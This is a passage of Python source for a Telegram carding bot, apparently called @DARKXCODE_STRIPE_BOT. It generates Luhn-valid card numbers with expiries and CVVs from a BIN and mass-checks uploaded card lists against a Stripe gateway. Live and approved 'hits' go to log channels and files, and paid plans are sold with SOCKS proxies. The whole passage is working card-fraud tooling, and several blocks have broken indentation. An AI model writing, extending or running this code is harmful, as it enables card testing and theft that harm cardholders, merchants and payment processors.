<b>🔧 Generating Cards...</b>
══════════════════════
<b>BIN:</b> <code>{bin_input[:6]}</code>
<b>Quantity:</b> {quantity} cards
<b>Cost:</b> FREE (no credits required!)
"""

    if fixed_month:
        processing_text += f"<b>Month:</b> {fixed_month}\n"
    if fixed_year:
        processing_text += f"<b>Year:</b> {fixed_year}\n"
    if fixed_cvv:
        processing_text += f"<b>CVV:</b> {fixed_cvv}\n"

    processing_text += "══════════════════════"

    processing_msg = await update.message.reply_text(
        processing_text, parse_mode=ParseMode.HTML
    )

    try:
        start_time = time.time()

        # Generate cards
        generated_cards = await generate_cc_cards_advanced(
            bin_input, quantity, fixed_month, fixed_year, fixed_cvv
        )

        time_taken = time.time() - start_time

        if not generated_cards:
            await processing_msg.edit_text(
                "<b>❌ Generation Failed</b>\n" "Could not generate any valid cards",
                parse_mode=ParseMode.HTML,
            )
            return

        # Update user stats (NO CREDIT DEDUCTION - ALWAYS FREE)
        updates = {
            "gen_used_today": user["gen_used_today"] + quantity,
            "total_cards_generated": user.get("total_cards_generated", 0) + quantity,
        }

        await update_user(user_id, updates)

        # Get BIN info
        bin_info = get_bin_info(bin_input[:6])

        # Determine how to send results
        if quantity <= 20:
            # Send as message
            result_text = format_gen_result_advanced_html(
                bin_input,
                generated_cards,
                quantity,
                username,
                time_taken,
                bin_info,
                fixed_month,
                fixed_year,
                fixed_cvv,
            )
            await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        else:
            # Send as file
            await processing_msg.edit_text(
                f"<b>✅ Generated {quantity} cards</b>\n" f"Creating download file...",
                parse_mode=ParseMode.HTML,
            )

            # Create filename: bin-quantity-timestamp.txt
            timestamp = int(time.time())
            filename = f"{bin_input[:6]}-{quantity}-{timestamp}.txt"

            # Write cards to file
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"╔══════════════════════════════════╗\n")
                f.write(f"║     GENERATED CARDS FILE         ║\n")
                f.write(f"╚══════════════════════════════════╝\n\n")
                f.write(
                    f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                )
                f.write(f"BIN: {bin_input[:6]}\n")
                f.write(f"Quantity: {quantity}\n")
                f.write(f"Valid Cards: {len(generated_cards)}\n")
                f.write(f"User: @{username}\n")

                if fixed_month:
                    f.write(f"Month: {fixed_month}\n")
                if fixed_year:
                    f.write(f"Year: {fixed_year}\n")
                if fixed_cvv:
                    f.write(f"CVV: {fixed_cvv}\n")

                f.write(f"\n{'=' * 50}\n")
                f.write(f"CARDS:\n")
                f.write(f"{'=' * 50}\n")

                for i, card in enumerate(generated_cards, 1):
                    f.write(f"{i}. {card}\n")

                f.write(f"\n{'=' * 50}\n")
                f.write(f"BIN Info:\n")
                f.write(f"Bank: {bin_info['bank']}\n")
                f.write(f"Country: {bin_info['country']}\n")
                f.write(f"\nBot: @DARKXCODE_STRIPE_BOT\n")

            # Send file
            caption = f"""
<b>💳 Generated Cards File</b>
══════════════════════
<b>BIN:</b> <code>{bin_input[:6]}</code>
<b>Quantity:</b> {quantity} cards
<b>Valid:</b> {len(generated_cards)} cards
<b>Cost:</b> FREE (always free!)
<b>Time:</b> {time_taken:.2f}s
<b>User:</b> @{username}
══════════════════════
"""

            await update.message.reply_document(
                document=open(filename, "rb"),
                filename=filename,
                caption=caption,
                parse_mode=ParseMode.HTML,
            )

            # Clean up
            os.remove(filename)
            await processing_msg.delete()

        # Update bot statistics
        await update_bot_stats(
            {
                "total_cards_generated": quantity,
                "total_credits_used": 0,  # Always 0 for free generation
            }
        )

    except Exception as e:
        logger.error(f"Generation error: {e}")
        await processing_msg.edit_text(
            f"<b>❌ Generation Failed</b>\n" f"Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML,
        )


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate valid CC numbers from BIN with full card format support"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"

    # Check daily reset
    await check_daily_reset(user_id)
    user = await get_user(user_id)  # Refresh user data

    if not context.args:
        help_text = f"""
<b>💳 CC GENERATOR</b>
══════════════════════
<b>Usage:</b> <code>/gen BIN [quantity]</code>
<b>Or:</b> <code>/gen cc|mm|yy|cvv</code>

<b>Examples:</b>
• <code>/gen 411111</code>
• <code>/gen 411111 100</code>
• <code>/gen 411111|12|25</code>
• <code>/gen 411111|12|25|123</code>

<b>Daily Limits:</b>
• Free: <b>1000</b> cards/day
• Basic: <b>5000</b> cards/day  
• Pro: <b>10000</b> cards/day

<b>Your Usage:</b> {user['gen_used_today']}/{user['daily_gen_limit']} Today
══════════════════════
"""
        await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
        return

    # Parse input
    input_text = " ".join(context.args)

    # Check if input is in card format (contains |)
    if "|" in input_text:
        # Parse as card format: BIN|MM|YY or BIN|MM|YY|CVV
        return await generate_from_card_format(
            update, context, input_text, user_id, user, username
        )
    else:
        # Parse as BIN + quantity format
        return await generate_from_bin_format(
            update, context, input_text, user_id, user, username
        )


async def generate_cc_cards_advanced(
    bin_input, quantity, fixed_month=None, fixed_year=None, fixed_cvv=None
):
    """Generate valid CC numbers with optional fixed values"""
    generated = []

    for _ in range(quantity):
        try:
            # Start with BIN (first 6 digits)
            if len(bin_input) < 6:
                prefix = bin_input.ljust(6, "0")[:6]
            else:
                prefix = bin_input[:6]

            # Determine card length based on BIN
            if prefix.startswith(("34", "37")):  # Amex
                total_length = 15
            elif prefix.startswith("4"):  # Visa
                total_length = 16
            elif prefix.startswith(("51", "52", "53", "54", "55")):  # Mastercard
                total_length = 16
            elif prefix.startswith(("60", "65")):  # Discover
                total_length = 16
            else:
                total_length = 16  # Default

            # Generate remaining digits
            remaining_length = total_length - len(prefix)
            if remaining_length < 1:
                remaining_length = total_length - 6

            # Generate random middle digits
            middle_digits = "".join(
                str(random.randint(0, 9)) for _ in range(remaining_length - 1)
            )

            # Create base number without check digit
            base_number = prefix + middle_digits

            # Calculate Luhn check digit
            check_digit = calculate_luhn_check_digit(base_number)

            # Complete card number
            card_number = base_number + str(check_digit)

            # Use fixed values or generate random
            month = fixed_month or str(random.randint(1, 12)).zfill(2)

            if fixed_year:
                year = fixed_year[-2:]  # Use last 2 digits if 4-digit year provided
            else:
                year = str(random.randint(24, 29))  # 2024-2029

            if fixed_cvv:
                cvv = fixed_cvv
            else:
                # Generate appropriate CVV length
                if card_number.startswith(("34", "37")):  # Amex
                    cvv = str(random.randint(1000, 9999))  # 4 digits
                else:
                    cvv = str(random.randint(100, 999))  # 3 digits

            # Format card - SHOW FULL CARD NUMBER (no masking)
            card = f"{card_number}|{month}|{year}|{cvv}"
            generated.append(card)

        except Exception as e:
            logger.error(f"Card generation error: {e}")
            continue

    return generated


def calculate_luhn_check_digit(number):
    """Calculate Luhn check digit"""
    total = 0
    reverse_digits = number[::-1]

    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        total += n

    check_digit = (10 - (total % 10)) % 10
    return check_digit


def format_gen_result_advanced_html(
    bin_input,
    cards,
    quantity,
    username,
    time_taken,
    bin_info,
    fixed_month=None,
    fixed_year=None,
    fixed_cvv=None,
):
    """Format generation results in HTML with full card numbers"""
    generated_count = len(cards)

    result = f"""
<b>💳 CC GENERATION RESULT</b>
══════════════════════
<b>BIN:</b> <code>{bin_input[:6]}</code>
<b>Quantity:</b> {quantity} cards
<b>Generated:</b> {generated_count} valid cards
<b>Time:</b> {time_taken:.2f}s
"""

    # Add fixed values if provided
    if fixed_month:
        result += f"<b>Month:</b> {fixed_month}\n"
    if fixed_year:
        result += f"<b>Year:</b> {fixed_year}\n"
    if fixed_cvv:
        result += f"<b>CVV:</b> {fixed_cvv}\n"

    result += f"""
━━━━━━━━━━━━━━━━━━━━
<b>BIN Info:</b>
• <b>Bank:</b> {bin_info['bank']}
• <b>Country:</b> {bin_info['country']} {bin_info['country_flag']}
• <b>Type:</b> {get_card_type(bin_input[:2])}
━━━━━━━━━━━━━━━━━━━━
<b>Generated Cards ({min(generated_count, 20)} shown):</b>
"""

    # Add cards with FULL numbers (no masking)
    for i, card in enumerate(cards[:20], 1):
        cc, mon, year, cvv = card.split("|")
        # Show full card number
        result += f"{i}. <code>{cc}|{mon}|{year}|{cvv}</code>\n"

    if generated_count > 20:
        result += f"... and {generated_count - 20} more cards\n"

    result += f"""
━━━━━━━━━━━━━━━━━━━━
<b>User:</b> @{username}
<b>Bot:</b> @DARKXCODE_STRIPE_BOT
══════════════════════
"""

    return result


def get_card_type(bin_prefix):
    """Determine card type from BIN prefix"""
    prefix = bin_prefix[:2]

    if prefix.startswith("4"):
        return "Visa"
    elif prefix in ["51", "52", "53", "54", "55"]:
        return "Mastercard"
    elif prefix in ["34", "37"]:
        return "American Express"
    elif prefix.startswith("60") or prefix.startswith("65"):
        return "Discover"
    elif prefix.startswith("35"):
        return "JCB"
    elif prefix.startswith("30") or prefix.startswith("36") or prefix.startswith("38"):
        return "Diners Club"
    else:
        return "Unknown"


async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PRIVATE mass check - hits sent to PRIVATE_LOG_CHANNEL"""
    user_id = update.effective_user.id

    # Add at the beginning:
    user = await get_user(user_id)

    # Check daily reset
    await check_daily_reset(user_id)

    # Check concurrency limit
    can_check, message = await can_start_mass_check(user_id)
    if not can_check:
        await update.message.reply_text(message)
        return

    username = update.effective_user.username or f"user_{user_id}"

    if not user["joined_channel"]:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start"
        )
        return

    if user_id not in files_storage:
        await update.message.reply_text(
            "🔒 *PRIVATE MASS CHECK*\n"
            "══════════════════════\n"
            "1. Upload a .txt file with cards\n"
            "2. Use `/mchk` to start\n\n"
            "*Credit Costs Per Card:*\n"
            "• ✅ Approved/🔥 Live: 3 credits\n"
            "• 🔢 CCN/💳 CVV: 2 credits\n"
            "• ❌ Declined: 1 credit\n\n",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Get file info
    file_info = files_storage[user_id]
    cards = file_info["cards"]

    # Check mass check limit for free users
    if user["plan"] == "free" and len(cards) > user["mass_check_limit"]:
        await update.message.reply_text(
            f"❌ Mass check limit exceeded\n"
            f"Free users can check max {user['mass_check_limit']} cards at once\n"
            f"Upgrade plan for higher limits"
        )
        return

    # We can't check credits upfront since we don't know the status yet
    # We'll check and deduct as we process each card

    # Increment active checks
    await increment_active_checks(user_id)

    # Create status message
    status_msg = await update.message.reply_text(
        f"🔒 Starting PRIVATE Mass Check\n"
        f"File ID: {file_info['file_id']}\n"
        f"Cards: {len(cards)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Processing..."
    )

    # Start private mass check task
    task = asyncio.create_task(
        private_mass_check_task(
            user_id=user_id,
            cards=cards,
            status_msg=status_msg,
            chat_id=update.message.chat_id,
            context=context,
            username=username,  # Pass username if needed
        )
    )

    # Store task info
    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "is_private": True,
        "start_time": time.time(),
        "approved": 0,
        "live": 0,
        "dead": 0,
        "ccn": 0,
        "cvv": 0,
        "risk": 0,
        "fraud": 0,
        "total_credits_used": 0,
        "current_card": None,
        "status_message_id": status_msg.message_id,
        "chat_id": update.message.chat_id,
    }


async def public_mass_check_task(user_id, cards, status_msg, chat_id, context):
    """PUBLIC mass checking - hits to APPROVED_LOG_CHANNEL"""
    try:
        if user_id not in files_storage:
            await status_msg.edit_text("❌ File data not found")
            return

        file_info = files_storage[user_id]
        file_id = file_info["file_id"]
        username = file_info["username"]

        # Initialize hits collections
        approved_hits = []
        live_hits = []

        # Initialize counters
        processed = 0
        approved = 0
        live = 0
        dead = 0
        ccn = 0
        cvv = 0
        risk = 0
        fraud = 0
        total_credits_used = 0

        user = await get_user(user_id)

        # Process cards
        for i, card in enumerate(cards):
            if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
                break

            # Check user credits before processing
            user = await get_user(user_id)
            if user["credits"] <= 0:
                await status_msg.edit_text(
                    f"❌ INSUFFICIENT CREDITS\n"
                    f"Processed: {processed}/{len(cards)}\n"
                    f"Used: {total_credits_used} credits\n"
                    f"Remaining: 0 credits\n\n"
                    f"Add more credits to continue."
                )
                break

            # Update status every 5 cards
            if i % 5 == 0 or i == len(cards) - 1:
                if user_id in checking_tasks:
                    elapsed = time.time() - checking_tasks[user_id]["start_time"]
                else:
                    elapsed = time.time() - time.time()

                progress = (processed / len(cards)) * 100

                status_text = f"""⚡ PUBLIC MASS CHECK
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}
Credits Used: {total_credits_used}
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved}
❌ Declined: {dead}
━━━━━━━━━━━━━━━━━━━━"""
                try:
                    await status_msg.edit_text(status_text)
                except:
                    pass

            # Check card
            start_time = time.time()
            result_card, status, message, http_code = await check_single_card_fast(card)
            actual_time = time.time() - start_time

            # Get credit cost
            credit_cost = get_credit_cost(status)

# Check if user has enough credits for this card (only for paid cards)
if credit_cost > 0:
    # Refresh user data to get current credits
    current_user = await get_user(user_id)
    if current_user["credits"] < credit_cost:
        logger.warning(f"User {user_id} ran out of credits during mass check")
        break
    user = current_user  # Update cached user

            processed += 1
            total_credits_used += credit_cost

            # Update counters
            if status == "approved":
                approved += 1
                approved_hits.append(card)
                save_hit_card(user_id, card, "approved", is_private=False)
                await send_to_log_channel(
                    context,
                    card,
                    status,
                    message,
                    username,
                    actual_time,
                    is_private=False,
                )

            elif status == "live":
                live += 1
                live_hits.append(card)
                save_hit_card(user_id, card, "live", is_private=False)
                await send_to_log_channel(
                    context,
                    card,
                    status,
                    message,
                    username,
                    actual_time,
                    is_private=False,
                )

            elif status == "ccn":
                ccn += 1
            elif status == "cvv":
                cvv += 1
            elif status == "risk":
                risk += 1
            elif status == "fraud":
                fraud += 1
            else:  # dead and other declined statuses
                dead += 1

            # Update user credits and stats
            status_field = f"{status}_cards"
            updates = {
                "credits": user["credits"] - credit_cost,
                "credits_spent": user.get("credits_spent", 0) + credit_cost,
                "total_checks": user.get("total_checks", 0) + 1,
            }

            if status_field in [
                "approved_cards",
                "live_cards",
                "ccn_cards",
                "cvv_cards",
                "declined_cards",
                "risk_cards",
                "fraud_cards",
            ]:
                updates[status_field] = user.get(status_field, 0) + 1

            await update_user(user_id, updates)

            # Update task tracking
            if user_id in checking_tasks:
                checking_tasks[user_id][status] = (
                    checking_tasks[user_id].get(status, 0) + 1
                )
                checking_tasks[user_id]["cards_processed"] = processed
                checking_tasks[user_id]["total_credits_used"] = total_credits_used

            # Format and send result for approved/live cards
            if status in ["approved", "live"]:
                result_text = format_universal_result(
                    card_data=card,
                    status=status,
                    message=message,
                    gateway="Stripe Auth",
                    username=username,
                    time_taken=actual_time,
                )

                # Send to user
                try:
                    await context.bot.send_message(
                        chat_id=chat_id, text=result_text, parse_mode=ParseMode.HTML
                    )
                except:
                    pass

            # Update bot stats
            await update_bot_stats(
                {
                    "total_checks": 1,
                    "total_credits_used": credit_cost,
                    f"total_{status}": 1,
                }
            )

            # Small delay
            if i < len(cards) - 1:
                await asyncio.sleep(random.uniform(1.0, 2.0))

        # Save hit files
        try:
            if approved_hits:
                public_file = f"{PUBLIC_HITS_FOLDER}/{file_id}_approved.txt"
                with open(public_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(approved_hits))

            if live_hits:
                public_file = f"{PUBLIC_HITS_FOLDER}/{file_id}_live.txt"
                with open(public_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(live_hits))
        except Exception as e:
            logger.error(f"Error saving hit files: {e}")

        # Final summary
        if user_id in checking_tasks:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
        else:
            elapsed = time.time() - time.time()

        summary = f"""✅ PUBLIC MASS CHECK COMPLETE
File: {file_id}
Total Cards: {len(cards)}
Processed: {processed}
Time: {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━
FINAL RESULTS:
✅ Approved: {approved} cards
❌ Declined: {dead} cards
━━━━━━━━━━━━━━━━━━━━
Total Credits Used: {total_credits_used}
User: @{username}
━━━━━━━━━━━━━━━━━━━━
🤖 @DARKXCODE_STRIPE_BOT
"""

        await status_msg.edit_text(summary)

    except Exception as e:
        logger.error(f"Error in public_mass_check_task: {e}")
        try:
            await status_msg.edit_text(f"❌ Error during public mass check: {str(e)}")
        except:
            pass
    finally:
        # Decrement active checks
        await decrement_active_checks(user_id)
        
        # Cleanup
        if user_id in checking_tasks:
            del checking_tasks[user_id]
        if user_id in files_storage:
            del files_storage[user_id]


async def plans_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available plans and pricing"""
    user_id = update.effective_user.id
    user = await get_user(user_id)

    plans_text = f"""
📊 *AVAILABLE PLANS*
══════════════════════
*Your Current Plan:* **{user['plan'].upper()}**
*Plan Expiry:* {user.get('plan_expiry', 'Not set')}
══════════════════════

🆓 *FREE PLAN*
• Daily Credits: 100
• Mass Check Limit: 100 cards
• Max Concurrent Checks: 1
• Proxy Type: HTTP
• VBV Checks/Day: 5
• CC Generation/Day: 200 cards
• Price: FREE
══════════════════════

💰 *BASIC PLAN - $2/month*
• Daily Credits: 500
• Mass Check Limit: 500 cards
• Max Concurrent Checks: 2
• Proxy Type: SOCKS4
• VBV Checks/Day: 20 (+15)
• CC Generation/Day: 1000 cards (+800)
• Speed: Medium (3-4 cards/sec)
• Price: $2/month
══════════════════════

⚡ *PRO PLAN - $5/month*
• Daily Credits: 2000
• Mass Check Limit: Unlimited
• Max Concurrent Checks: 3
• Proxy Type: SOCKS5
• VBV Checks/Day: 100 (+95)
• CC Generation/Day: 5000 cards (+4800)
• Speed: Fast (5-7 cards/sec)
• Priority Support
• Price: $5/month
══════════════════════

💳 *HOW TO UPGRADE:*
1. Send payment to owner
2. Contact @ISHANT_OFFICIAL with:
   - Your User ID: `{user_id}`
   - Plan you want: Basic/Pro
   - Payment proof
3. Owner will upgrade your account
══════════════════════

📞 *Contact Owner:* @ISHANT_OFFICIAL
🤖 *Bot:* @DARKXCODE_STRIPE_BOT
"""

    keyboard = [
        [InlineKeyboardButton("📞 Contact Owner", url="https://t.me/ISHANT_OFFICIAL")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        plans_text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup
    )


async def setplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Set user plan"""
    if update.effective_user.id not in ADMIN_IDS:
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ Usage: /setplan user_id plan [days]\n"
            "Example: /setplan 123456789 pro 30\n"
            "Plans: free, basic, pro"
        )
        return

    try:
        target_id = int(context.args[0])
        plan = context.args[1].lower()

        if plan not in PLAN_CONFIGS:
            await update.message.reply_text(
                f"❌ Invalid plan. Choose from: {', '.join(PLAN_CONFIGS.keys())}"
            )
            return

        # Set expiry days (default 30)
        days = 30
        if len(context.args) > 2:
            days = int(context.args[2])

        expiry_date = (
            (datetime.datetime.now() + datetime.timedelta(days=days)).date().isoformat()
        )

        # Get plan config
        plan_config = PLAN_CONFIGS[plan].copy()

        updates = {"plan": plan, "plan_expiry": expiry_date, **plan_config}

        await update_user(target_id, updates)

        await update.message.reply_text(
            f"✅ Plan updated for user {target_id}\n"
            f"Plan: {plan.upper()}\n"
            f"Expiry: {expiry_date}\n"
            f"Daily Credits: {plan_config['daily_credits']}"
        )

        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=f"🎉 PLAN UPGRADED!\n\n"
                f"Your plan has been upgraded to *{plan.upper()}*\n"
                f"Expiry: {expiry_date}\n"
                f"Daily Credits: {plan_config['daily_credits']}\n\n"
                f"Enjoy premium features!",
                parse_mode=ParseMode.MARKDOWN,
            )
        except:
            pass

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")


async def private_mass_check_task(
    user_id, cards, status_msg, chat_id, context, username=None
):
    """PRIVATE mass checking - hits to PRIVATE_LOG_CHANNEL"""
    try:
        if user_id not in files_storage:
            await status_msg.edit_text("❌ File data not found")
            return

        file_info = files_storage[user_id]
        file_id = file_info["file_id"]
        username = username or file_info.get("username", f"user_{user_id}")

        # Initialize hits collections
        approved_hits = []
        live_hits = []

        # Initialize counters
        processed = 0
        approved = 0
        live = 0
        dead = 0
        ccn = 0
        cvv = 0
        risk = 0
        fraud = 0
        total_credits_used = 0

        user = await get_user(user_id)

        # Process cards
        for i, card in enumerate(cards):
            if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
                break

            # Check user credits before processing
            user = await get_user(user_id)
            if user["credits"] <= 0:
                await status_msg.edit_text(
                    f"❌ INSUFFICIENT CREDITS\n"
                    f"Processed: {processed}/{len(cards)}\n"
                    f"Used: {total_credits_used} credits\n"
                    f"Remaining: 0 credits\n\n"
                    f"Add more credits to continue."
                )
                break

            # Update status every 5 cards
            if i % 5 == 0 or i == len(cards) - 1:
                if user_id in checking_tasks:
                    elapsed = time.time() - checking_tasks[user_id]["start_time"]
                else:
                    elapsed = time.time() - time.time()

                progress = (processed / len(cards)) * 100

                status_text = f"""🔒 PRIVATE MASS CHECK
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}
Credits Used: {total_credits_used}
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved}
❌ Declined: {dead}
━━━━━━━━━━━━━━━━━━━━"""
                try:
                    await status_msg.edit_text(status_text)
                except:
                    pass

            # Check card
            start_time = time.time()
            result_card, status, message, http_code = await check_single_card_fast(card)
            actual_time = time.time() - start_time

# Get credit cost
credit_cost = get_credit_cost(status)

# Check if user has enough credits for this card (only for paid cards)
if credit_cost > 0:
    # Refresh user data to get current credits
    current_user = await get_user(user_id)
    if current_user["credits"] < credit_cost:
        logger.warning(f"User {user_id} ran out of credits during mass check")
        break
    user = current_user  # Update cached user

            # Update counters
            if status == "approved":
                approved += 1
                approved_hits.append(card)
                save_hit_card(user_id, card, "approved", is_private=True)
                # Send encrypted card to private log channel
                encrypted_card = encrypt_card_data(
                    card
                )  # FIXED: was encrypt_card_data(card_string)
                await send_to_log_channel(
                    context,
                    card,
                    status,
                    message,
                    username,
                    actual_time,
                    is_private=True,
                )

                # Send original card to user
                result_text = format_universal_result(
                    card_data=card,
                    status=status,
                    message=message,
                    gateway="Stripe Auth",
                    username=username,
                    time_taken=actual_time,
                )
                try:
                    await context.bot.send_message(
                        chat_id=chat_id, text=result_text, parse_mode=ParseMode.HTML
                    )
                except:
                    pass

            elif status == "live":
                live += 1
                live_hits.append(card)
                save_hit_card(user_id, card, "live", is_private=True)
                # Send encrypted card to private log channel
                encrypted_card = encrypt_card_data(
                    card
                )  # FIXED: was encrypt_card_data(card_string)
                await send_to_log_channel(
                    context,
                    card,
                    status,
                    message,
                    username,
                    actual_time,
                    is_private=True,
                )

                # Send original card to user
                result_text = format_universal_result(
                    card_data=card,
                    status=status,
                    message=message,
                    gateway="Stripe Auth",
                    username=username,
                    time_taken=actual_time,
                )
                try:
                    await context.bot.send_message(
                        chat_id=chat_id, text=result_text, parse_mode=ParseMode.HTML
                    )
                except:
                    pass

            elif status == "ccn":
                ccn += 1
            elif status == "cvv":
                cvv += 1
            elif status == "risk":
                risk += 1
            elif status == "fraud":
                fraud += 1
            else:  # dead and other declined statuses
                dead += 1

            # Update user credits and stats
            status_field = f"{status}_cards"
            updates = {
                "credits": user["credits"] - credit_cost,
                "credits_spent": user.get("credits_spent", 0) + credit_cost,
                "total_checks": user.get("total_checks", 0) + 1,
            }

            if status_field in [
                "approved_cards",
                "live_cards",
                "ccn_cards",
                "cvv_cards",
                "declined_cards",
                "risk_cards",
                "fraud_cards",
            ]:
                updates[status_field] = user.get(status_field, 0) + 1

            await update_user(user_id, updates)

            # Update task tracking
            if user_id in checking_tasks:
                checking_tasks[user_id][status] = (
                    checking_tasks[user_id].get(status, 0) + 1
                )
                checking_tasks[user_id]["cards_processed"] = processed
                checking_tasks[user_id]["total_credits_used"] = total_credits_used

            # Update bot stats
            await update_bot_stats(
                {
                    "total_checks": 1,
                    "total_credits_used": credit_cost,
                    f"total_{status}": 1,
                }
            )

            # Small delay (shorter than public for private checks)
            if i < len(cards) - 1:
                await asyncio.sleep(random.uniform(0.5, 0.8))

        # Save hit files (AFTER THE LOOP)
        try:
            if approved_hits:
                private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
                with open(private_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(approved_hits))

            if live_hits:
                private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
                with open(private_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(live_hits))
        except Exception as e:
            logger.error(f"Error saving hit files: {e}")

        # Final summary
        if user_id in checking_tasks:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
        else:
            elapsed = time.time() - time.time()

        summary = f"""✅ PRIVATE MASS CHECK COMPLETE
File: {file_id}
Total Cards: {len(cards)}
Processed: {processed}
Time: {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━
FINAL RESULTS:
✅ Approved: {approved} cards
❌ Declined: {dead} cards
━━━━━━━━━━━━━━━━━━━━
Total Credits Used: {total_credits_used}
User: @{username}
━━━━━━━━━━━━━━━━━━━━
🤖 @DARKXCODE_STRIPE_BOT
"""

        await status_msg.edit_text(summary)

    except Exception as e:
        logger.error(f"Error in private_mass_check_task: {e}")
        try:
            await status_msg.edit_text(f"❌ Error during private mass check: {str(e)}")
        except:
            pass
    finally:
        # Decrement active checks
        await decrement_active_checks(user_id)
        
        # Cleanup
        if user_id in checking_tasks:
            del checking_tasks[user_id]
        if user_id in files_storage:
            del files_storage[user_id]


async def cleanup_task_callback(user_id):
    """Callback to cleanup after task completion"""
    try:
        await decrement_active_checks(user_id)

        # Cleanup after a delay to ensure everything is processed
        await asyncio.sleep(2)

        if user_id in checking_tasks:
            del checking_tasks[user_id]
        if user_id in files_storage:
            del files_storage[user_id]
    except Exception as e:
        logger.error(f"Error in cleanup_task_callback: {e}")


async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PUBLIC mass check - hits sent to APPROVED_LOG_CHANNEL"""
    user_id = update.effective_user.id

    # Add at the beginning:
    user = await get_user(user_id)

    # Check daily reset
    await check_daily_reset(user_id)

    # Check concurrency limit
    can_check, message = await can_start_mass_check(user_id)
    if not can_check:
        await update.message.reply_text(message)
        return

    username = update.effective_user.username or f"user_{user_id}"

    if not user["joined_channel"]:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start"
        )
        return

    if user_id not in files_storage:
        await update.message.reply_text(
            "⚡ *PUBLIC MASS CHECK*\n"
            "══════════════════════\n"
            "1. Upload a .txt file with cards\n"
            "2. Use `/pmchk` to start\n\n"
            "*Credit Costs Per Card:*\n"
            "• ✅ Approved/🔥 Live: 3 credits\n"
            "• 🔢 CCN/💳 CVV: 2 credits\n"
            "• ❌ Declined: 1 credit\n\n",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Get file info
    file_info = files_storage[user_id]
    cards = file_info["cards"]

    # Check mass check limit for free users
    if user["plan"] == "free" and len(cards) > user["mass_check_limit"]:
        await update.message.reply_text(
            f"❌ Mass check limit exceeded\n"
            f"Free users can check max {user['mass_check_limit']} cards at once\n"
            f"Upgrade plan for higher limits"
        )
        return

    # Increment active checks
    await increment_active_checks(user_id)

    # Create status message
    status_msg = await update.message.reply_text(
        f"⚡ Starting PUBLIC Mass Check\n"
        f"File ID: {file_info['file_id']}\n"
        f"Cards: {len(cards)}\n"
        f"Hits will be forwarded to Public channel...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Processing..."
    )

    # Start public mass check task
    task = asyncio.create_task(
        public_mass_check_task(
            user_id=user_id,
            cards=cards,
            status_msg=status_msg,
            chat_id=update.message.chat_id,
            context=context,
        )
    )

    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "is_private": False,
        "start_time": time.time(),
        "approved": 0,
        "live": 0,
        "dead": 0,
        "ccn": 0,
        "cvv": 0,
        "risk": 0,
        "fraud": 0,
        "total_credits_used": 0,
        "current_card": None,
        "status_message_id": status_msg.message_id,
        "chat_id": update.message.chat_id,
    }

    # Add done callback for cleanup
    task.add_done_callback(
        lambda t: asyncio.create_task(cleanup_task_callback(user_id))
    )


async def test_channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if bot can send to channels"""
    if update.effective_user.id not in ADMIN_IDS:
        return

    # Test format
    test_card = "4111111111111111|12|25|123"
    test_message = "✅ TEST HIT - Bot is working!"

    try:
        # Test PUBLIC channel
        await send_to_log_channel(
            context=context,
            card=test_card,
            status="approved",
            message=test_message,
            username="TEST_BOT",
            time_taken=1.5,
            is_private=False,
        )

        # Test PRIVATE channel
        await send_to_log_channel(
            context=context,
            card=test_card,
            status="live",
            message=test_message,
            username="TEST_BOT",
            time_taken=1.2,
            is_private=True,
        )

        await update.message.reply_text(
            "✅ Channel tests sent successfully!\n"
            "Check both channels for test messages."
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Channel test failed:\n{str(e)}")


async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context):
    """Mass checking with file logging"""
    if user_id not in files_storage:
        await status_msg.edit_text("❌ File data not found. Please upload file again.")
        return

    file_info = files_storage[user_id]
    file_id = file_info["file_id"]
    hits_file = file_info["hits_file"]

    # Initialize hits files
    approved_hits = []
    live_hits = []

    processed = 0
    approved = 0
    live = 0
    dead = 0
    ccn = 0
